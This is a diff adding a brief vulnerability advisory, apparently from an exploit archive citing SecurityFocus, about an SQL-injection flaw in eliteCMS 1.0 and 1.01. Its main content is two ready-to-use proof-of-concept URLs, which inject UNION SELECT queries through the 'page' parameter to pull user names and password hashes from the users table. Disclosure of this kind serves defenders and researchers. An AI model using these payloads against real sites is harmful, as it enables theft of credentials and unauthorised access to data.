@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/30990/info
+
+eliteCMS is prone to an SQL-injection vulnerability because it fails to properly sanitize user-supplied input.
+
+Attackers may exploit this issue to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+
+eliteCMS 1.0 and 1.01 are vulnerable; other versions may also be affected. 
+
+http://www.example.com/index.php?page=-1%20union%20all%20select%201,2,3,4,user_name,h_password%20from%20users/*
+
+http://www.example.com/index.php?page=-1'+union+select+1,concat(user_name,0x3a,h_password),3,4,5,6,7,8,9,10,11+from+users+limit+0,1/* 
